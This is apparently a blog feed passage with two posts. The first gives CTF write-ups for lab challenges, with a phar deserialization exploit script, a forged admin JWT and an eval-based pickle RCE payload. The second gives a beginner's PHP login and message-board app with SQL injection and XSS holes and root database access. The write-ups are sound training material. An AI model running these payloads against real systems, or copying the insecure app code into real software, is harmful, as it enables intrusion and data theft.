&#125;</span><br></pre></td></tr></table></figure></p><p>unlink可以反序列化,而且<code>delete.php</code>文件incldue了<code>class.php</code>,也就可以利用<code>FileList</code>类的<code>__destruct()</code>方法,满足攻击的三个条件:<br>1.phar文件要能够上传到服务器端。<br>2.要有可用的魔术方法作为“跳板”。<br>3.文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。<br>然后分析<code>class.php</code>类的结构关系,构造脚本生成phar文件:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class User &#123;</span><br><span class="line">        public $db;</span><br><span class="line">    &#125; </span><br><span class="line">    class File&#123;</span><br><span class="line">        public $filename;</span><br><span class="line">        public function __construct($name)&#123;</span><br><span class="line">            $this-&gt;filename=$name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class FileList &#123;</span><br><span class="line">        private $files;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;files=array(new File(&apos;/flag.txt&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    $o = new User();</span><br><span class="line">    $o-&gt;db =new FileList();</span><br><span class="line">    @unlink(&quot;phar.phar&quot;);</span><br><span class="line">    $phar = new Phar(&quot;phar.phar&quot;);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span><br><span class="line">    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">    //签名自动计算</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>上传生成的<code>phar.phar</code>,然后抓包改<code>Content-Type</code>为<code>image/jpeg</code>.<br><img src="http://i1.fuimg.com/665720/cc18d45cc72570ee.png" alt="Markdown"><br>然后再delete,抓包改filename为<code>phar://phar.jpg</code>.成功读取flag.<br><img src="http://i1.fuimg.com/665720/83e490ae5dca94a5.png" alt="Markdown"></p><h2 id="ikun"><a href="#ikun" class="headerlink" title="ikun"></a>ikun</h2><p><a href="http://web44.buuoj.cn/" target="_blank" rel="noopener">靶机</a><br>先注册个账号,登陆.<br>F12,提示这题脑洞很大留了hint,看到ikun们冲鸭,一定要买到lv6!!!,应该是要买lv6的账号,写个脚本找:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://web44.buuoj.cn/shop?page="</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">500</span>):</span><br><span class="line">r =requests.get(url+str(i))</span><br><span class="line"><span class="keyword">if</span> <span class="string">'lv6.png'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">print(<span class="string">'find it'</span>+str(i))</span><br><span class="line">exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p><p>发现是在180页.<br><img src="http://i1.fuimg.com/665720/12f7681ee9a5d519.png" alt="Markdown"><br>hint:I’m flag man说明找对了,点击buy钱不够肯定买不了的,一直操作失败,F12以后找到post表单,价格改为1,再点buy虽然还是操作失败,但是返回以后发现进入了购物车,变成了折扣选项,可以抓包改discount<code>0.0000000000000000000000000001</code>,然后成功跳转<code>b1g_m4mber</code>这个页面.<br><img src="http://i1.fuimg.com/665720/f7a4d91dfa43c164.png" alt="Markdown"><br>提示只能admin访问,查看cookie里有jwt,以前做过jwt的题,看来是修改jwt了.<br>用<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">c-jwt-cracker</a>脚本跑密钥.<br><img src="http://i2.tiimg.com/665720/3c7c5093c23d9e17.png" alt="Markdown"><br>跑出来是<code>1Kun</code>,<a href="https://jwt.io/" target="_blank" rel="noopener">jwt.io</a>encode一下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo</span><br></pre></td></tr></table></figure></p><p>修改cookie.<br><img src="http://i2.tiimg.com/665720/3beeea18531198e1.png" alt="Markdown"><br>成功跳转F12,<code>&lt;!-- 潜伏敌后已久,只能帮到这了 --&gt;</code>,成功得到源码,发现是tornado,前两个星期看了Django和flask,正好看看tornado框架,开始审计吧.<br>发现<code>Admin.py</code>存在反序列化操作,对应的地方就是admin界面点击一键成为大会员的地方:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">'become'</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=p, member=<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p><p>直接编写脚本:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (eval,(<span class="string">'().__class__.__bases__[0].__subclasses__()[40]("/flag.txt").read()'</span>,))</span><br><span class="line"><span class="comment">#当然这里也可以不写这么花QAQ,写一个简单的open也是可以的.</span></span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="keyword">print</span> a</span><br></pre></td></tr></table></figure></p><p>运行脚本生成payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c__builtin__%0Aeval%0Ap0%0A%28S%27%28%29.__class__.__bases__%5B0%5D.__subclasses__%28%29%5B40%5D%28%22/flag.txt%22%29.read%28%29%27%0Ap1%0Atp2%0ARp3%0A.</span><br></pre></td></tr></table></figure></p><p>然后直接抓包修改<code>become</code>参数,就可以得到flag了.</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;warmup&quot;&gt;&lt;a href=&quot;#warmup&quot; class=&quot;headerlink&quot; title=&quot;warmup&quot;&gt;&lt;/a&gt;warmup&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;!http://web5.buuoj.cn&quot;&gt;靶机&lt;/a&gt;&lt;br&gt;F12发现source.php,打开发现源码,顺着源码又发现了hint.php,得到&lt;code&gt;flag in ffffllllaaaagggg&lt;/code&gt;,继续阅读源码。&lt;br&gt;
    
    </summary>
    
      <category term="web安全学习笔记" scheme="http://chenxiyuan.vip/categories/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="ctf" scheme="http://chenxiyuan.vip/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>php简单的登陆注册功能</title>
    <link href="http://chenxiyuan.vip/2019/07/20/php%E7%AE%80%E5%8D%95%E7%9A%84%E7%99%BB%E9%99%86%E6%B3%A8%E5%86%8C%E5%8A%9F%E8%83%BD/"/>
    <id>http://chenxiyuan.vip/2019/07/20/php简单的登陆注册功能/</id>
    <published>2019-07-20T04:09:39.000Z</published>
    <updated>2019-07-29T07:37:33.471Z</updated>
    
    <content type="html"><![CDATA[<p>5月份的时候，郁师傅让我不用框架写个简单的登陆注册上传头像留言板的功能，要熟悉开发。还是贴出来记录一下吧。</p><ul><li>login.html<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-type"</span> <span class="attr">content</span>=<span class="string">"text/html;charset=utf-8"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"login.php"</span><span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>username<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span>&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>password<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"password"</span>&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"login"</span>&gt;</span>login<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"register"</span>&gt;</span>register<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><a id="more"></a><ul><li><p>login.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">protect</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">$string = trim(strip_tags(addslashes($string)));</span><br><span class="line"><span class="keyword">return</span> $string;&#125;</span><br><span class="line">header(<span class="string">"Content-type: text/html; charset=utf-8"</span>); </span><br><span class="line">$link=mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">''</span>,<span class="string">'webtest'</span>);</span><br><span class="line"><span class="keyword">if</span>(!$link)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'数据库连接失败'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'login'</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        $username = protect($_POST[<span class="string">'username'</span>]);</span><br><span class="line">    $password = protect($_POST[<span class="string">'password'</span>]);</span><br><span class="line">        $query=<span class="string">"select * from `user` where `username`= '$username' and `password`= '"</span>.md5($password).<span class="string">"'"</span>;</span><br><span class="line">        $result=mysqli_query($link,$query);</span><br><span class="line">        <span class="keyword">if</span>(!$result)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"error:"</span>.mysqli_error($link);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (mysqli_num_rows($result)!=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"登陆成功！"</span>;</span><br><span class="line">            $_SESSION[<span class="string">'username'</span>]=$username;</span><br><span class="line">            header(<span class="string">"Location:home.php"</span>);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">"用户名或密码错误！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'register'</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        $username = protect($_POST[<span class="string">'username'</span>]);</span><br><span class="line">        $password = protect($_POST[<span class="string">'password'</span>]);</span><br><span class="line">        <span class="comment">/**先检查username是否存在 */</span></span><br><span class="line">        $query=<span class="string">"select * from `user` where `username`= '$username' "</span>;</span><br><span class="line">        $result=mysqli_query($link,$query);</span><br><span class="line">        <span class="keyword">if</span>(!$result)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"error:"</span>.mysqli_error($link);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (mysqli_num_rows($result)!=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"username已存在"</span>);</span><br><span class="line">            header(<span class="string">"Location:login.html"</span>);</span><br><span class="line">        &#125; </span><br><span class="line">    <span class="comment">/**执行插入 */</span></span><br><span class="line">        $query=<span class="string">"INSERT INTO `user` SET `username`='$username',"</span>.<span class="string">"`password`='"</span>.md5($password).<span class="string">"'"</span>;</span><br><span class="line">        $result=mysqli_query($link,$query);</span><br><span class="line">        <span class="keyword">if</span>(!$result)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"error:"</span>.mysqli_error($link);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"注册成功！"</span>;</span><br><span class="line">            header(<span class="string">"Location:login.html"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>home.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"login.php"</span>;</span><br><span class="line">$username=$_SESSION[<span class="string">'username'</span>];</span><br><span class="line"></span><br><span class="line">$link=mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">''</span>,<span class="string">'webtest'</span>);</span><br><span class="line">        <span class="keyword">if</span>(!$link)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'数据库连接失败'</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            $query=<span class="string">"select * from `touxiang` where `username` = '$username'"</span>;</span><br><span class="line">            $result=mysqli_fetch_array(mysqli_query($link,$query));</span><br><span class="line">            $touxiang=$result[<span class="string">'image'</span>];</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//header('Content-type: image/JPEG',true);</span></span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;center&gt;&lt;table style=' text-align: center' border='2'&gt;</span></span><br><span class="line"><span class="string">                &lt;tr&gt;&lt;th&gt;头像&lt;/th&gt;&lt;th&gt;用户名&lt;/th&gt;&lt;/tr&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;td&gt;&lt;img src='data:image/jpeg;base64,$touxiang' width='40' height='40'&gt;&lt;/td&gt;&lt;td&gt;$username&lt;/td&gt;&lt;/tr&gt;"</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/table&gt;&lt;/center&gt;"</span>;</span><br><span class="line">            <span class="comment">//echo $touxiang;</span></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"Content-type"</span> content=<span class="string">"text/html;charset=utf-8"</span> /&gt;</span><br><span class="line">    &lt;title&gt;主页&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;center&gt;</span><br><span class="line">    &lt;form method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;table border=<span class="string">"1"</span>&gt;</span><br><span class="line">        请上传用户头像&lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span> id=<span class="string">"file"</span> /&gt;</span><br><span class="line">            &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"上传头像"</span>/&gt;</span><br><span class="line">        </span><br><span class="line">    &lt;/table&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &lt;h6&gt;输入留言内容&lt;/h6&gt;</span><br><span class="line">        &lt;form action=<span class="string">"home.php"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">            标题:&lt;input type=<span class="string">"text"</span> name=<span class="string">"title"</span>&gt;&lt;br&gt;</span><br><span class="line">            内容:&lt;textarea name=<span class="string">"content"</span>&gt;&lt;/textarea&gt;&lt;br&gt;</span><br><span class="line">            &lt;input type=<span class="string">"submit"</span> name=<span class="string">"insert"</span>&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">        &lt;hr&gt;</span><br><span class="line">    &lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        </span><br><span class="line">$link=mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">''</span>,<span class="string">'webtest'</span>);</span><br><span class="line">        <span class="keyword">if</span>(!$link)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'数据库连接失败'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/**修改头像功能 */</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>]))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'error'</span>]==<span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"上传成功"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                $fp = fopen($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],<span class="string">"rb"</span>); </span><br><span class="line">                $image =base64_encode(fread($fp,$_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>])); </span><br><span class="line">                $query=<span class="string">"select * from `touxiang` where `username` = '$username'"</span>;</span><br><span class="line">                $result=mysqli_query($link,$query);</span><br><span class="line">                <span class="keyword">if</span> (mysqli_num_rows($result)!=<span class="number">0</span>)<span class="comment">//判断是否存在</span></span><br><span class="line">                &#123;</span><br><span class="line">                    $query=<span class="string">"UPDATE touxiang SET `username`='$username',`image`='$image'"</span>;<span class="comment">//更改</span></span><br><span class="line">                    mysqli_query($link,$query);</span><br><span class="line">                &#125;<span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    $query=<span class="string">"insert into touxiang SET `username`='$username',`image`='$image'"</span>;</span><br><span class="line">                    mysqli_query($link,$query);</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/**留言板功能 */</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'insert'</span>]))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;p1&gt;留言板&lt;/center&gt;'</span>;</span><br><span class="line">                $title = protect($_POST[<span class="string">'title'</span>]);</span><br><span class="line">                $content =protect($_POST[<span class="string">'content'</span>]);</span><br><span class="line">                $query=<span class="string">"insert into liuyan SET `username`='$username',`title`='$title',`content`='$content'"</span>;</span><br><span class="line">                $result1=mysqli_query($link,$query);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            $result2=mysqli_query($link,<span class="string">"select * from liuyan where `username`='$username'"</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string">            &lt;center&gt;</span></span><br><span class="line"><span class="string">            &lt;table border="1"&gt;&lt;tr&gt;</span></span><br><span class="line"><span class="string">                &lt;td&gt;标题&lt;/td&gt;</span></span><br><span class="line"><span class="string">                &lt;td&gt;内容&lt;/td&gt;</span></span><br><span class="line"><span class="string">            &lt;/tr&gt; </span></span><br><span class="line"><span class="string">            &lt;/center&gt;</span></span><br><span class="line"><span class="string">            '</span> ;</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            <span class="keyword">while</span>($row =mysqli_fetch_array($result2))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;"</span>.$row[<span class="string">'title'</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>.$row[<span class="string">'content'</span>].<span class="string">"&lt;/tr&gt;"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>mysql数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> webtest;</span><br><span class="line"><span class="keyword">USE</span> webtest;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`user`</span> (<span class="string">`username`</span> <span class="built_in">VARCHAR</span>(<span class="number">20</span>),<span class="string">`password`</span> <span class="built_in">VARCHAR</span>(<span class="number">20</span>) );</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`touxaing`</span> (<span class="string">`username`</span> <span class="built_in">VARCHAR</span>(<span class="number">20</span>),<span class="string">`image`</span> MEDIUMBLOB);</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`liuyan`</span> (<span class="string">`username`</span> <span class="built_in">VARCHAR</span>(<span class="number">20</span>),<span class="string">`title`</span> <span class="built_in">VARCHAR</span>(<span class="number">40</span>),<span class="string">`content`</span> <span class="built_in">VARCHAR</span>(<span 